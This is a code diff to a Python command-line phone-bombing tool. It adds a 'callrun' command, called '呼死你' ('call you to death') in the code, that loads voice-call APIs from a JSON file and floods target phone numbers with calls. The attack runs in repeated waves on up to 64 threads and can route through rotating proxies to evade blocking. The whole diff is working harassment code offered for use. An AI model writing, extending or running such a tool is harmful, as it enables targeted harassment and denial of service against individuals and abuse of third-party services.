@@ -96,6 +96,29 @@ def load_getapi() -> list:
             raise ValueError
 
 
+def load_voice_api() -> List[API]:
+    """load voice api from voice_api.json
+    :return: voice api list
+    """
+    json_path = pathlib.Path(path, 'voice_api.json')
+    if not json_path.exists():
+        logger.error("voice_api.json file not exists!")
+        raise ValueError
+
+    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
+        try:
+            datas = json.loads(j.read())
+            APIs = [
+                API(**data)
+                for data in datas
+            ]
+            logger.success(f"voice_api.json 加载完成 接口数:{len(APIs)}")
+            return APIs
+        except Exception as why:
+            logger.error(f"Json file syntax error:{why}")
+            raise ValueError
+
+
 @click.command()
 @click.option("--thread", "-t", help="线程数(默认64)", default=64)
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", multiple=True, type=str)
@@ -174,6 +197,50 @@ def oneRun(phone):
             pass
 
 
+@click.command('callrun')
+@click.option("--thread", "-t", help="线程数(默认64)", default=64)
+@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", multiple=True, type=str)
+@click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
+@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
+@click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
+def callRun(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
+    """传入线程数和手机号启动呼死你,支持多手机号"""
+    while not phone:
+        phone = input("Phone: ")
+    for i in phone:
+        if not i.isdigit():
+            logger.error("手机号必须为纯数字！")
+            sys.exit(1)
+    logger.info(
+        f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
+    try:
+        _voice_api = load_voice_api()
+        _proxies = load_proxies()
+        # fix: by Ethan
+        if not _proxies:
+            if enable_proxy:
+                logger.error("无法读取任何代理....请取消-e")
+                sys.exit(1)
+            _proxies = [None]
+    except ValueError:
+        logger.error("读取接口出错!请检查voice_api.json文件!")
+        sys.exit(1)
+
+    with ThreadPoolExecutor(max_workers=thread) as pool:
+        for i in range(1, frequency + 1):
+            logger.success(f"第{i}波呼死你开始！")
+            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
+            for proxy in _proxies:
+                logger.success(f"第{i}波呼死你 - 当前正在使用代理：" +
+                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波呼死你开始...")
+                # 不可用的代理或API过多可能会影响轰炸效果
+                for api in _voice_api:
+                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
+                        reqFunc, api, phone)
+                logger.success(f"第{i}波呼死你提交结束！休息{interval}s.....")
+                time.sleep(interval)
+
+
 @click.command()
 def update():
     """从 github 获取最新接口"""
@@ -206,6 +273,7 @@ cli.add_command(run)
 cli.add_command(update)
 cli.add_command(asyncRun)
 cli.add_command(oneRun)
+cli.add_command(callRun)
 
 if __name__ == "__main__":
     cli()
